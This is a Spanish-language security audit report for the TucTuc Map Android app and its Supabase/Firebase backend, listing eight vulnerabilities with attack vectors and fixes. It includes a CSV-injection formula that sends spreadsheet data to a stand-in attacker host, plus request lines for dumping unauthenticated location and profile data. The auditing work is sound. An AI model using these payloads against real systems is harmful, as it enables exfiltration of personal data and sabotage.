# 🛡️ Reporte de Auditoría de Seguridad: TucTuc Map (Android + Backend)

**Proyecto:** TucTuc Map (`com.tuctucmap.app` — `versionCode = 13`, `versionName = "1.1.2"`)  
**Fecha de Auditoría:** 4 de noviembre de 2026  
**Alcance:** Código fuente Android (`tuctucMap/`), configuración de compilación (`build.gradle.kts`, `proguard-rules.pro`, `AndroidManifest.xml`) y esquema relacional/seguridad en Supabase (`databaseTuctucApp/db.sql`).  
**Nivel de Riesgo Global Actual:** 🟠 **MEDIO-ALTO** *(Controles criptográficos locales y triggers SQL robustos en Supabase, pero con exposición crítica en la capa de tiempo real de Firebase RTDB y políticas `SELECT` permisivas).*

---

## 1. Resumen Ejecutivo

La arquitectura de **TucTuc Map** implementa defensas sólidas poco comunes en aplicaciones móviles regionales: cifrado local respaldado por hardware (`AndroidKeyStore` AES-256-GCM en `SecurePrefs.kt`), ofuscación R8 activa en producción y triggers `SECURITY DEFINER` en PostgreSQL que impiden la escalada de privilegios o la auto-aprobación de suscripciones desde el cliente.

Sin embargo, la arquitectura híbrida (**Supabase Auth + PostgreSQL** para identidad/persistencia y **Firebase Realtime Database** para telemetría GPS y despacho de viajes) presenta una **brecha arquitectónica crítica**: la app no utiliza `firebase-auth`, por lo que Firebase RTDB opera sin vinculación criptográfica con el token JWT de Supabase. Adicionalmente, ciertas políticas RLS (`Row Level Security`) en PostgreSQL permiten la enumeración masiva de perfiles por cualquier usuario autenticado.

| Severidad | Cantidad | Resumen de Hallazgos |
| :--- | :---: | :--- |
| 🔴 **Crítica** | **1** | **SEC-01:** Acceso no autenticado (`auth == null`) a Firebase RTDB (`/driver_locations` y `/trips`). |
| 🟠 **Alta** | **2** | **SEC-02:** Política RLS `SELECT` en `public.profiles` expone datos personales (PII) de todos los usuarios.<br>**SEC-03:** Manipulación de métricas financieras/viajes en `public.trips` y monto de solicitud en `subscription_payment_requests`. |
| 🟡 **Media** | **3** | **SEC-04:** Inyección de Fórmulas CSV (*CSV Injection*) en exportaciones administrativas.<br>**SEC-05:** Almacenamiento en texto plano de `user_role` en `SharedPreferences` (`tuctuc_prefs`).<br>**SEC-06:** Ausencia de `network_security_config.xml` y reglas de *backup* vacías para Android 12+. |
| 🔵 **Baja** | **2** | **SEC-07:** Desfase de `ServerClock.offsetMillis` manipulable desde el nodo público `.info/serverTimeOffset`.<br>**SEC-08:** Urls de infraestructura por defecto embebidas en `build.gradle.kts`. |

---

## 2. Vulnerabilidades Identificadas y Remediación

### 🔴 [SEC-01] CRÍTICA: Falta de Autenticación en Firebase Realtime Database (`driver_locations` y `trips`)

* **Ubicación en Código:**
  * [`tuctucMap/app/build.gradle.kts`](../tuctucMap/app/build.gradle.kts#L118-L120) — Solo incluye `com.google.firebase:firebase-database-ktx`; no existe dependencia de `firebase-auth`.
  * [`SupabaseRepository.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/repository/SupabaseRepository.kt#L68-L71) — `locationsRef = database.getReference("driver_locations")` y `tripsRef = database.getReference("trips")`.
  * [`SupabaseRepository.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/repository/SupabaseRepository.kt#L949-L977) — `requestTrip()` permite que pasajeros invitados (`guest_<timestamp>`) escriban directamente en `/trips`.
* **Análisis Técnico:**
  La autenticación de conductores, pasajeros y administradores ocurre exclusivamente en **Supabase Auth** (`io.github.jan.supabase:auth-kt`). Debido a que nunca se inicia sesión en Firebase Auth (ni mediante *Custom Tokens* ni autenticación anónima controlada), todas las lecturas y escrituras hacia `https://tuctuc-map-default-rtdb.firebaseio.com` se ejecutan con `auth == null` desde la perspectiva de las reglas de seguridad de Firebase.
* **Vector de Ataque e Impacto:**
  Cualquier atacante que extraiga el `FIREBASE_RTDB_URL` del APK (o mediante inspección de red) puede consultar `GET https://tuctuc-map-default-rtdb.firebaseio.com/driver_locations.json` o enviar peticiones `PUT`/`DELETE` con `curl` para:
  1. **Espionaje de flota:** Descargar en tiempo real la ubicación GPS exacta, nombre, placa y teléfono de los 50 conductores.
  2. **Denegación de Servicio (DoS) / Sabotaje:** Borrar el nodo `/driver_locations` o `/trips`, dejando el mapa en blanco para todos los pasajeros, o inyectar cientos de viajes falsos con estado `"requested"` que harán sonar la alerta de voz (`TextToSpeech`) simultáneamente en los teléfonos de todos los conductores cercanos.
  3. **Suplantación (*Spoofing*):** Inyectar conductores fantasma en el mapa o cancelar viajes activos de otros conductores (`updateTripStatus`).
* **Recomendación de Mitigación:**
  * **Opción A (Sin costo adicional en Firebase — Recomendada a corto plazo):** Integrar `firebase-auth-ktx` con *Anonymous Auth* + validación estricta de estructura/esquema en `database.rules.json` de Firebase:
    * Deshabilitar lectura en la raíz de `/trips` (`".read": false` en `/trips`, permitiendo lectura únicamente por `$tripId` o consulta acotada).
    * Validar en reglas de Firebase que `/driver_locations/$uid` contenga tipos y longitudes exactas (`lat`, `lon`, `lastUpdated`) y que solo pueda escribirse el nodo individual `/driver_locations/$uid` (prohibir escritura o borrado en `/driver_locations` raíz).
  * **Opción B (Arquitectura Unificada en Supabase):** Migrar la señalización efímera de `/trips` a **Supabase Realtime Broadcast / Postgres Changes** (donde el JWT de Supabase ya está validado por RLS) o emitir un *Firebase Custom Token* desde una Edge Function de Supabase al iniciar sesión como conductor.

---

### 🟠 [SEC-02] ALTA: Exposición Masiva de Datos Personales (PII) en `public.profiles` por Política RLS Permisiva

* **Ubicación en Código:**
  * [`databaseTuctucApp/db.sql`](../databaseTuctucApp/db.sql#L454-L455):
    ```sql
    CREATE POLICY "Profiles viewable by authenticated users"
      ON public.profiles FOR SELECT USING (auth.uid() IS NOT NULL);
    ```
* **Análisis Técnico:**
  La política `SELECT` sobre la tabla maestra `public.profiles` permite que **cualquier usuario autenticado** (incluso un pasajero recién registrado en 10 segundos) lea todas las filas y columnas de `public.profiles`.
* **Vector de Ataque e Impacto:**
  Un atacante autenticado puede extraer su `access_token` (JWT) o usar las credenciales públicas `SUPABASE_URL` + `SUPABASE_KEY` tras hacer login y ejecutar:
  `GET https://<project>.supabase.co/rest/v1/profiles?select=*`
  Con una sola petición HTTP obtendrá la base de datos completa de la empresa: **nombres completos, correos electrónicos (`email`), números de teléfono (`phone`), placas (`license_plate`), roles (`admin`, `driver`, `passenger`) y fechas de vencimiento de suscripción** de los 50 conductores, los 200 pasajeros y los administradores.
* **Recomendación de Mitigación:**
  Restringir la política `SELECT` en `public.profiles` para que un usuario normal solo pueda leer su propio perfil (`auth.uid() = id`) o los datos públicos mínimos de conductores activos, mientras que el acceso completo quede reservado a administradores (`public.is_admin()`):
  ```sql
  DROP POLICY IF EXISTS "Profiles viewable by authenticated users" ON public.profiles;

  CREATE POLICY "Users view own profile or admins view all"
    ON public.profiles FOR SELECT
    USING (
      auth.uid() = id
      OR public.is_admin()
      OR (role = 'driver' AND approval_status = 'aprobado')
    );
  ```

---

### 🟠 [SEC-03] ALTA: Falsificación de Historial de Viajes en `public.trips` y Manipulación de Montos en Solicitudes de Pago

* **Ubicación en Código:**
  * [`databaseTuctucApp/db.sql`](../databaseTuctucApp/db.sql#L527-L539) — Políticas `INSERT` y `UPDATE` en `public.trips`.
  * [`databaseTuctucApp/db.sql`](../databaseTuctucApp/db.sql#L208-L216) — Función RPC `approve_subscription_payment_request` inserta `v_req.amount` directamente en `driver_subscriptions`.
  * [`SupabaseRepository.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/repository/SupabaseRepository.kt#L609-L632) — `submitPaymentRequest` envía el `amount` calculado por el cliente.
* **Análisis Técnico:**
  1. **En `subscription_payment_requests`:** El cliente móvil envía `plan_type` y `amount` en el `INSERT`. Cuando el administrador aprueba la solicitud mediante `approve_subscription_payment_request(p_request_id)`, el RPC toma `v_req.amount` (enviado originalmente por el conductor) y lo inserta en `driver_subscriptions`. Si un conductor malicioso envía por API `plan_type = 'mensual'` con `amount = 1.00` (o `amount = 999999.00`), distorsionará las métricas financieras de recaudación (`totalRevenue`, `monthRevenue`) del panel administrativo si el administrador aprueba la solicitud sin notar el monto alterado.
  2. **En `public.trips`:** La política `"Trips updatable by participants"` permite a cualquier `driver_id` o `passenger_id` hacer `UPDATE` irrestricto de cualquier columna (incluyendo `fare`, `distance_km`, `created_at` o `status`) sobre viajes antiguos ya cerrados.
* **Recomendación de Mitigación:**
  * En `approve_subscription_payment_request` (`db.sql`), ignorar el `amount` enviado por el cliente o validarlo contra los precios oficiales almacenados en `public.app_config` (`price_semanal`, `price_quincenal`, `price_mensual`).
  * Agregar un trigger o restricción en `public.trips` que impida modificar registros cuyo `status` ya sea `'completed'`, `'rejected'` o `'cancelled'`.

---

### 🟡 [SEC-04] MEDIA: Inyección de Fórmulas CSV (*CSV Injection*) en Exportaciones Administrativas

* **Ubicación en Código:**
  * [`AdminSubscriptionsTab.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/ui/screens/admin/AdminSubscriptionsTab.kt#L646-L660) — Función `exportAndShareCsv`.
  * [`AdminTripsScreen.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/ui/screens/admin/AdminTripsScreen.kt#L749-L775) — Exportación CSV de viajes.
* **Análisis Técnico:**
  Al generar archivos `.csv` para compartir por WhatsApp o abrir en Microsoft Excel / Google Sheets, campos controlados por el usuario como `referenceNumber` (número de boleta), `driverName`, `passengerName` o `message` se concatenan directamente:
  ```kotlin
  sb.appendLine("\"$dateStr\",\"${h.driverName}\",\"${h.driverPhone}\",...,\"${h.referenceNumber}\"")
  ```
  Ni se escapan las comillas dobles internas (`"` -> `""`) ni se neutralizan los prefijos de ejecución de fórmulas (`=`, `+`, `-`, `@`, `\t`, `\r`).
* **Vector de Ataque e Impacto:**
  Un conductor o pasajero malicioso puede ingresar como nombre o referencia de boleta `=HYPERLINK("http://atacante.com/leak?data="&A1:Z10, "Ver Boleta")`. Cuando el administrador exporte el reporte financiero mensual y lo abra en Excel o Google Sheets, la hoja de cálculo ejecutará la fórmula.
* **Recomendación de Mitigación:**
  Crear una función utilitaria `sanitizeCsvCell(input: String)` que duplique comillas internas (`input.replace("\"", "\"\"")`) y anteponga un apóstrofe (`'`) si el texto comienza con `=`, `+`, `-`, `@`, `\t` o `\r`.

---

### 🟡 [SEC-05] MEDIA: Almacenamiento de Rol (`user_role`) en Texto Plano en `SharedPreferences`

* **Ubicación en Código:**
  * [`MainActivity.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/MainActivity.kt#L112-L148)
  * [`Navigation.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/ui/Navigation.kt#L88)
* **Análisis Técnico:**
  Mientras que el token de sesión (`supabase_session`) y la fecha de vencimiento de suscripción (`driver_last_sub_end`) se cifran correctamente usando `SecurePrefs` (AES-256-GCM), la preferencia `"user_role"` (`"admin"`, `"driver"`, `"passenger"`) se guarda en el archivo XML en texto plano `tuctuc_prefs.xml`.
  Además, en [`MainActivity.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/MainActivity.kt#L143-L147):
  ```kotlin
  val startDestination = if (isAuthed && savedRole == "admin") {
      Screen.AdminHome.route
  } else if (isAuthed && savedRole == "driver") {
      Screen.DriverHome.route
  }
  ```
  Si el usuario ya tenía sesión iniciada (`isAuthed == true`), `MainActivity` confía inmediatamente en el `savedRole` local para decidir la pantalla inicial antes de verificar el rol contra el servidor.
* **Impacto:**
  En un dispositivo con acceso root o mediante manipulación local de `tuctuc_prefs.xml`, un conductor o pasajero autenticado puede cambiar `user_role` a `"admin"` y acceder a la interfaz gráfica de `AdminMainScreen`. *(Nota: Aunque verá la UI administrativa, las políticas RLS `public.is_admin()` en Supabase bloquearán la descarga de datos reales de PostgreSQL, pero **sí podrá ver el mapa de flota administrativa en vivo** porque `AdminFleetMapTab` lee de Firebase RTDB sin RLS).*
* **Recomendación de Mitigación:**
  Migrar `"user_role"` a [`SecurePrefs.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/SecurePrefs.kt) y validar `repository.getUserRole(uid)` al entrar a `AdminMainScreen`, redirigiendo fuera si el servidor no confirma `role == "admin"`.

---

### 🟡 [SEC-06] MEDIA: Ausencia de `network_security_config.xml` y Reglas de Extracción en Android 12+

* **Ubicación en Código:**
  * [`AndroidManifest.xml`](../tuctucMap/app/src/main/AndroidManifest.xml#L18-L29)
  * [`data_extraction_rules.xml`](../tuctucMap/app/src/main/res/xml/data_extraction_rules.xml#L1-L19)
  * [`backup_rules.xml`](../tuctucMap/app/src/main/res/xml/backup_rules.xml#L1-L13)
* **Análisis Técnico:**
  1. Aunque `android:allowBackup="false"` está declarado en `AndroidManifest.xml`, también se declara `android:dataExtractionRules="@xml/data_extraction_rules"`. En Android 12+ (API 31+), el sistema utiliza `data_extraction_rules.xml` para transferencias *device-to-device* (D2D) y copias en la nube, y actualmente dicho archivo tiene todas las etiquetas `<exclude>` comentadas.
  2. No se define un archivo `android:networkSecurityConfig` que deshabilite explícitamente el tráfico HTTP en texto plano (`cleartextTrafficPermitted="false"`).
* **Recomendación de Mitigación:**
  Agregar `<exclude domain="sharedpref" path="."/>` en `data_extraction_rules.xml` y configurar `network_security_config.xml` con `cleartextTrafficPermitted="false"`.

---

### 🔵 [SEC-07] BAJA: Sobrescritura de `ServerClock.offsetMillis` por Nodo Público de Firebase

* **Ubicación en Código:**
  * [`SupabaseRepository.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/repository/SupabaseRepository.kt#L96-L105)
* **Análisis Técnico:**
  `ServerClock.offsetMillis` es el reloj maestro anti-fraude usado para bloquear la UI de conductores con suscripción vencida (`Driver.isSubscriptionExpired`). Se sincroniza de forma segura contra PostgreSQL (`sync_server_time_and_expire`), pero simultáneamente escucha `.info/serverTimeOffset` de Firebase RTDB. Si la conexión con Firebase sufre manipulación o desfase local antes de que responda Supabase, el último evento en llegar sobrescribe `ServerClock.offsetMillis`.
* **Recomendación de Mitigación:**
  Dar prioridad jerárquica al timestamp devuelto por el RPC autenticado de Supabase (`sync_server_time_and_expire`), usando `.info/serverTimeOffset` de Firebase únicamente como *fallback* cuando el reloj de Supabase aún no se haya sincronizado (`if (!isSyncedWithSupabase)`).

---

### 🔵 [SEC-08] BAJA: URLs de Producción por Defecto en `build.gradle.kts`

* **Ubicación en Código:**
  * [`tuctucMap/app/build.gradle.kts`](../tuctucMap/app/build.gradle.kts#L54-L56)
* **Análisis Técnico:**
  Si `local.properties` no define `SUPABASE_URL` o `FIREBASE_RTDB_URL`, el script de Gradle inyecta las URLs reales del proyecto (`https://doypobovndxkbkikkozq.supabase.co` y `https://tuctuc-map-default-rtdb.firebaseio.com`). Aunque no incluye la llave secreta (`service_role`), expone los identificadores del proyecto en el repositorio Git.
* **Recomendación de Mitigación:**
  Dejar cadenas vacías `""` como valor por defecto en `build.gradle.kts` y exigir que provengan de `local.properties` o variables de entorno de CI/CD.

---

## 3. Controles de Seguridad Positivos Ya Implementados ✅

Es importante destacar las buenas prácticas que el proyecto **ya tiene implementadas correctamente**:

1. **Cifrado Criptográfico por Hardware (`SecurePrefs.kt`):**
   * Implementa `AES/GCM/NoPadding` con llaves de 256 bits en `AndroidKeyStore` e IV aleatorio de 12 bytes por escritura ([`SecurePrefs.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/SecurePrefs.kt#L28-L115)).
   * Elimina el *fallback* inseguro en texto plano y regenera automáticamente la llave maestra si el Keystore se corrompe.
2. **Protección Anti-Escalada de Privilegios en Base de Datos (`db.sql`):**
   * El trigger `trg_profile_insert_security` ([`db.sql`](../databaseTuctucApp/db.sql#L368-L395)) fuerza en el servidor que ningún registro nuevo pueda crearse con `role = 'admin'`, `approval_status = 'aprobado'` ni `subscription_end_date` arbitrario.
   * El trigger `trg_protect_profile_sensitive_columns` ([`db.sql`](../databaseTuctucApp/db.sql#L401-L433)) impide que un conductor edite su propio `role`, `approval_status` o `subscription_end_date` mediante llamadas directas a la API REST de Supabase.
3. **Aprobación Transaccional de Pagos (`approve_subscription_payment_request`):**
   * Utiliza bloqueo pesimista `FOR UPDATE` ([`db.sql`](../databaseTuctucApp/db.sql#L194-L199)) para evitar condiciones de carrera (*double-spending* o doble acreditación de días de suscripción si dos administradores aprueban el mismo pago al mismo tiempo).
4. **Sanitización de Longitudes para TTS y Payloads:**
   * Limita estrictamente `MAX_TRIP_MESSAGE_LENGTH = 100`, `MAX_PASSENGER_NAME_LENGTH = 50` y `MAX_PHONE_LENGTH = 15` ([`SupabaseRepository.kt`](../tuctucMap/app/src/main/java/com/example/tuctucmap/data/repository/SupabaseRepository.kt#L60-L63)), previniendo ataques de denegación de servicio por audio (`TextToSpeech`) en el teléfono del conductor.
5. **Ofuscación y Reducción de Código en Release:**
   * `isMinifyEnabled = true` e `isShrinkResources = true` activos en [`build.gradle.kts`](../tuctucMap/app/build.gradle.kts#L67-L68) con reglas de preservación de serialización en [`proguard-rules.pro`](../tuctucMap/app/proguard-rules.pro#L1-L45).
6. **Superficie de Exportación de Componentes Cerrada:**
   * `LocationTrackingService` tiene `android:exported="false"` en [`AndroidManifest.xml`](../tuctucMap/app/src/main/AndroidManifest.xml#L44-L47), impidiendo que otras apps instaladas en el teléfono inicien o detengan el servicio GPS del conductor.

---

## 4. Plan Priorizado de Remediación de Seguridad

| Prioridad | Acción Técnica | Esfuerzo Estimado | Archivos Involucrados |
| :---: | :--- | :---: | :--- |
| **P0 (Inmediata)** | Restringir la política `SELECT` de `public.profiles` en Supabase para evitar el volcado masivo de teléfonos y correos. | 15 min | `databaseTuctucApp/db.sql` |
| **P0 (Inmediata)** | Configurar reglas de seguridad (`database.rules.json`) en Firebase RTDB con validación de esquema y autenticación anónima/token. | 1 - 2 horas | Consola Firebase / `SupabaseRepository.kt` |
| **P1 (Corto Plazo)** | Validar el monto del plan en el servidor dentro de `approve_subscription_payment_request` contra `app_config` y bloquear `UPDATE` de viajes ya finalizados. | 30 min | `databaseTuctucApp/db.sql` |
| **P1 (Corto Plazo)** | Mover `"user_role"` a `SecurePrefs` y sanitizar celdas en exportaciones CSV administrativas. | 30 min | `MainActivity.kt`, `AdminSubscriptionsTab.kt`, `AdminTripsScreen.kt` |
| **P2 (Mediano Plazo)** | Configurar `network_security_config.xml` (`cleartextTrafficPermitted="false"`) y reglas `<exclude>` en `data_extraction_rules.xml`. | 20 min | `AndroidManifest.xml`, `res/xml/data_extraction_rules.xml` |

